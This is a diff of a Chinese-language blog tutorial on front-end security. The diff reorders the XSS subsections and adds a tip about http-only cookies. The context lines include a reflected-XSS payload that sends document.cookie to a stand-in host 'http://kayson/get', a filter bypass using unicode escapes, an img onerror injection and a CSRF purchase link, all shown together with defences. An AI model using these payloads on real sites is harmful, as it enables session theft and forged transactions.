@@ -137,7 +137,7 @@
 <meta property="og:site_name" content="一天一颗蛋的开心">
 <meta property="og:description" content="曾经的梦想是当个黑客，现在，算是圆了半个梦吧。  XSS攻击全名叫做Cross-site scripting，即跨域脚本攻击，重点在于“跨域”和“客户端执行”。咱们来举个栗子~">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2017-08-15T13:25:25.743Z">
+<meta property="og:updated_time" content="2017-08-21T08:32:42.770Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="简单聊聊常见的前端安全问题">
 <meta name="twitter:description" content="曾经的梦想是当个黑客，现在，算是圆了半个梦吧。  XSS攻击全名叫做Cross-site scripting，即跨域脚本攻击，重点在于“跨域”和“客户端执行”。咱们来举个栗子~">
@@ -475,7 +475,7 @@
                   <span class="post-meta-item-text">字数统计</span>
                 
                 <span title="字数统计">
-                  2,659
+                  2,707
                 </span>
               
 
@@ -518,14 +518,14 @@
 <h4 id="基于反射的XSS攻击"><a href="#基于反射的XSS攻击" class="headerlink" title="基于反射的XSS攻击"></a>基于反射的XSS攻击</h4><p>全名：Reflected XSS，主要依靠站点服务端返回脚本，在客户端触发执行从而发起WEB攻击。<br>假设有个买书网站：<code>book.com</code>，我们在其中搜索一本不存在的书籍，例如：“一天一颗蛋的开心的蛋是什么蛋？”，此时页面会发出请求<code>book.com/search?name=一天一颗蛋的开心的蛋是什么蛋？</code>，之后返回一条消息：<br><code>您搜索的书籍&quot;一天一颗蛋的开心的蛋是什么蛋？&quot;不存在</code><br>那么如果这个页面对于前端的输出数据没有进行稳妥的处理的话，我们可以尝试这么搜索：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;alert(<span class="string">'我这儿有啊！来我这儿买！'</span>)&lt;<span class="regexp">/script&gt;</span></div></pre></td></tr></table></figure></p>
 <p>那么结果自然就是显示一个弹窗。<br>那接下来如何实现攻击呢？要攻击咱们就要获取用户的数据，要获取数据自然要把信息传回我们的服务器（假设接收信息的地址是<code>http://kayson/get</code>），那咱们可以这样写：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;<span class="built_in">document</span>.location=<span class="string">'http://kayson/get?cookie='</span>+<span class="built_in">document</span>.cookie&lt;<span class="regexp">/script&gt;</span></div></pre></td></tr></table></figure></p>
 <p>但是呢，这样获取的都是我们自己的数据，没什么意义，我们需要的是别人的数据，所以咱们可以通过QQ群、微信群来群发，让别人来点击这个地址：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">book.com/search?name=&lt;script&gt;document.location=&apos;http://kayson/get?cookie=&apos;+document.cookie&lt;/script&gt;</div></pre></td></tr></table></figure></p>
-<h4 id="基于DOM或本地的XSS攻击"><a href="#基于DOM或本地的XSS攻击" class="headerlink" title="基于DOM或本地的XSS攻击"></a>基于DOM或本地的XSS攻击</h4><p>全名：DOM-based or local XSS，也举个栗子，现在常见的为用户提供的免费WiFi，提供免费wifi的网关会往你访问的任何页面插入一段脚本，从而植入悬浮广告（当然你可以关闭它），这貌似没什么，但如果插入的脚本是获取你敏感数据的恶意脚本那就不一样了。像这种直接存在于页面，无须经过服务器返回脚本处理就直接跨域发送用户信息的行为就是基于本地的XSS攻击。  </p>
-<h4 id="基于存储的XSS攻击"><a href="#基于存储的XSS攻击" class="headerlink" title="基于存储的XSS攻击"></a>基于存储的XSS攻击</h4><p>全名：Stored XSS，它是通过贴吧啊博客园啊等地方来发表带有恶意跨域脚本的帖子或文章，从而把恶意脚本存储在里面，每个访问该帖子/文章的人就会中招。  </p>
 <h4 id="如何防御"><a href="#如何防御" class="headerlink" title="如何防御"></a>如何防御</h4><p>目前来讲，最简单的办法防治办法，还是将前端输出数据都进行转义最为稳妥。比如，按照刚刚我们那个例子来说，其本质是，浏览器遇到script标签的话，则会执行其中的脚本。但是如果我们将script标签的进行转义，则浏览器便不会认为其是一个标签，但是显示的时候，还是会按照正常的方式去显示。<br>在php中有htmlentities这个方法，可以转义左右尖括号，JavaScript中我们可以这样写：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">htmlEntities</span>(<span class="params">str</span>) </span>&#123;</div><div class="line">    <span class="keyword">return</span> <span class="built_in">String</span>(str).replace(<span class="regexp">/&amp;/g</span>, <span class="string">'&amp;amp;'</span>).replace(<span class="regexp">/&lt;/g</span>, <span class="string">'&amp;lt;'</span>).replace(<span class="regexp">/&gt;/g</span>, <span class="string">'&amp;gt;'</span>).replace(<span class="regexp">/"/g</span>, <span class="string">'&amp;quot;'</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
 <p>但是，道高一尺魔高一丈，要知道直接给innerHTML赋值一段js是无法被执行的：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$(<span class="string">'div'</span>).innerHTML = <span class="string">'&lt;script&gt;alert("it'</span>s ok!<span class="string">");&lt;/script&gt;';</span></div></pre></td></tr></table></figure></p>
 <p>但是，jquery的append可以做到，究其原因，就是因为jquery会在将append元素变为fragment的时候，找到其中的script标签，再使用eval执行一遍。jquery的append使用的方式也是innerHTML。而innerHTML是会将unicode码转换为字符实体的。<br>利用这两种知识结合，我们可以得出，如果网站使用Qquery的append进行dom操作，那么我们可以将左右尖括号，使用unicode码伪装起来，就像<code>\u003cscript\u003ealert(&#39;okok&#39;);</code>。接下来转义的时候，伪装成\u003的&lt;会被漏掉，append的时候，则会被重新调用。<br>但但是！防住了script，咱们还得来看看img<br>img标签，在加载图片失败的时候，会调用该元素上的onerror事件。我们正可以利用这种方式来进行攻击。<br>正常的用户分享图片：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">    $username="&lt;script&gt;alert('kayson');&lt;/script&gt;";</div><div class="line">    $imgsrc="http://baidu.com?0.jpg";</div><div class="line">?&gt;</div><div class="line"><span class="tag">&lt;<span class="name">!DOCYTPE</span> <span class="attr">HTML</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span> /&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">div</span>&gt;</span></div><div class="line">            用户名：&lt;?php echo htmlentities($username);?&gt;</div><div class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">div</span>&gt;</span></div><div class="line">            这个是图片：</div><div class="line">            <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"&lt;?php echo $imgsrc;?&gt;"</span> /&gt;</span></div><div class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">div</span>&gt;</span></div><div class="line">            2</div><div class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">div</span>&gt;</span></div><div class="line">            3</div><div class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure></p>
 <p>此时会正常显示图片，但如果我们将图片地址换一种写法：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$imgsrc="\" onerror=\"javascript:alert('kayson');\"";</div></pre></td></tr></table></figure></p>
 <p>那么img标签就会被拼接成为：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;img src=<span class="string">"\" onerror=\"javascript:alert('kayson'); /&gt;</span></div></pre></td></tr></table></figure></p>
-<p>攻击完成。<br>至于防御手段嘛，和上面一样，转义一下就好。  </p>
+<p>攻击完成。<br>至于防御手段嘛，和上面一样，转义一下就好。<br><em>注！！</em>其实在现在浏览器，这些反射型的XSS最好的防御方法就是设置一下cookie的<code>http-only</code>属性，这样就不能通过<code>document.cookied</code>的方式获取cookie了。  </p>
+<h4 id="基于DOM或本地的XSS攻击"><a href="#基于DOM或本地的XSS攻击" class="headerlink" title="基于DOM或本地的XSS攻击"></a>基于DOM或本地的XSS攻击</h4><p>全名：DOM-based or local XSS，也举个栗子，现在常见的为用户提供的免费WiFi，提供免费wifi的网关会往你访问的任何页面插入一段脚本，从而植入悬浮广告（当然你可以关闭它），这貌似没什么，但如果插入的脚本是获取你敏感数据的恶意脚本那就不一样了。像这种直接存在于页面，无须经过服务器返回脚本处理就直接跨域发送用户信息的行为就是基于本地的XSS攻击。  </p>
+<h4 id="基于存储的XSS攻击"><a href="#基于存储的XSS攻击" class="headerlink" title="基于存储的XSS攻击"></a>基于存储的XSS攻击</h4><p>全名：Stored XSS，它是通过贴吧啊博客园啊等地方来发表带有恶意跨域脚本的帖子或文章，从而把恶意脚本存储在里面，每个访问该帖子/文章的人就会中招。 </p>
 <h3 id="CSRF攻击"><a href="#CSRF攻击" class="headerlink" title="CSRF攻击"></a>CSRF攻击</h3><p>全名：Cross-site request forgery，即跨站请求伪造。也被称为“One Click Attack”或者Session Riding，通常缩写为CSRF或者XSRF，是一种对网站的恶意利用。<br>其实就是网站中的一些提交行为，被黑客利用，你在访问黑客的网站的时候，进行的操作，会被操作到其他网站上。<br>XSS是利用用户对当前网站的信任来发起攻击，而CSRF是利用网站对用户的信任来发起攻击。  </p>
 <h4 id="如何攻击"><a href="#如何攻击" class="headerlink" title="如何攻击"></a>如何攻击</h4><p>依旧拿上述的图买书的站点打个比方，如果它的安全机制很松懈——只要用户登录了网站后，只要没关闭浏览器，在任何情况都可以作为一个已通过身份验证的用户来做购书、借书操作（无须重新登录或者输入支付密码什么的）。<br>那么我们给一位用户发送一份邮件，里面放有一条转向购书执行页面的链接或者，在邮件中插入一张图片：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">'http://book.com/pay?bookid=100'</span>/&gt;</span></div></pre></td></tr></table></figure></p>
 <p>img、script、iframe标签都是不受同源策略限制的，假设你使用的邮箱很直白地给用户即时显示这张图片，而该用户又刚好登录了book.com且没有关闭浏览器，那么src里的连接就会立刻访问book.com/pay页面，并按照已通过身份验证的情况来处理，从而做了购书的操作。<br>相信现在你会很清楚为何现在的邮箱都不会直接显示邮件里的图片了吧——都是为了你的安全考虑。  </p>
@@ -576,7 +576,7 @@
   <p><span>本文标题:</span><a href="/security-of-FE.html">简单聊聊常见的前端安全问题</a></p>
   <p><span>文章作者:</span><a href="/" title="访问 Kayson0512 的个人博客">Kayson0512</a></p>
   <p><span>发布时间:</span>2017年08月15日 - 20:08</p>
-  <p><span>最后更新:</span>2017年08月15日 - 21:08</p>
+  <p><span>最后更新:</span>2017年08月21日 - 16:08</p>
   <p><span>原始链接:</span><a href="/security-of-FE.html" title="简单聊聊常见的前端安全问题">http://chenkaixin.cn/security-of-FE.html</a>
     <span class="copy-path"  title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="http://chenkaixin.cn/security-of-FE.html"  aria-label="复制成功！"></i></span>
   </p>
@@ -660,8 +660,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/css relative and absolute.html" rel="next" title="绝对定位和相对定位">
-                <i class="fa fa-chevron-left"></i> 绝对定位和相对定位
+              <a href="/closure.html" rel="next" title="闭包究竟是什么？">
+                <i class="fa fa-chevron-left"></i> 闭包究竟是什么？
               </a>
             
           </div>
@@ -669,6 +669,10 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
+            
+              <a href="/webpack-config.html" rel="prev" title="webpack config">
+                webpack config <i class="fa fa-chevron-right"></i>
+              </a>
             
           </div>
         </div>
@@ -772,7 +776,7 @@
           
             <div class="site-state-item site-state-posts">
               <a href="/archives/">
-                <span class="site-state-item-count">11</span>
+                <span class="site-state-item-count">13</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
@@ -794,7 +798,7 @@
             
             <div class="site-state-item site-state-tags">
               <a href="/tags/index.html">
-                <span class="site-state-item-count">19</span>
+                <span class="site-state-item-count">20</span>
                 <span class="site-state-item-name">标签</span>
               </a>
             </div>
@@ -882,7 +886,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#XSS攻击"><span class="nav-number">1.</span> <span class="nav-text">XSS攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#基于反射的XSS攻击"><span class="nav-number">1.1.</span> <span class="nav-text">基于反射的XSS攻击</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#基于DOM或本地的XSS攻击"><span class="nav-number">1.2.</span> <span class="nav-text">基于DOM或本地的XSS攻击</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#基于存储的XSS攻击"><span class="nav-number">1.3.</span> <span class="nav-text">基于存储的XSS攻击</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#如何防御"><span class="nav-number">1.4.</span> <span class="nav-text">如何防御</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CSRF攻击"><span class="nav-number">2.</span> <span class="nav-text">CSRF攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#如何攻击"><span class="nav-number">2.1.</span> <span class="nav-text">如何攻击</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#如何防御-1"><span class="nav-number">2.2.</span> <span class="nav-text">如何防御</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#注入攻击"><span class="nav-number">3.</span> <span class="nav-text">注入攻击</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#钓鱼网站"><span class="nav-number">4.</span> <span class="nav-text">钓鱼网站</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#在开发时要注意什么？"><span class="nav-number">5.</span> <span class="nav-text">在开发时要注意什么？</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#XSS攻击"><span class="nav-number">1.</span> <span class="nav-text">XSS攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#基于反射的XSS攻击"><span class="nav-number">1.1.</span> <span class="nav-text">基于反射的XSS攻击</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#如何防御"><span class="nav-number">1.2.</span> <span class="nav-text">如何防御</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#基于DOM或本地的XSS攻击"><span class="nav-number">1.3.</span> <span class="nav-text">基于DOM或本地的XSS攻击</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#基于存储的XSS攻击"><span class="nav-number">1.4.</span> <span class="nav-text">基于存储的XSS攻击</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CSRF攻击"><span class="nav-number">2.</span> <span class="nav-text">CSRF攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#如何攻击"><span class="nav-number">2.1.</span> <span class="nav-text">如何攻击</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#如何防御-1"><span class="nav-number">2.2.</span> <span class="nav-text">如何防御</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#注入攻击"><span class="nav-number">3.</span> <span class="nav-text">注入攻击</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#钓鱼网站"><span class="nav-number">4.</span> <span class="nav-text">钓鱼网站</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#在开发时要注意什么？"><span class="nav-number">5.</span> <span class="nav-text">在开发时要注意什么？</span></a></li></ol></div>
             
 
           </div>
@@ -950,9 +954,6 @@
 
 
 
-  
-  
-
 
 
 
@@ -981,12 +982,6 @@
 
   
   <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
-
-  
-  <script type="text/javascript" src="/lib/three/three.min.js"></script>
-
-  
-  <script type="text/javascript" src="/lib/three/three-waves.min.js"></script>
 
 
   
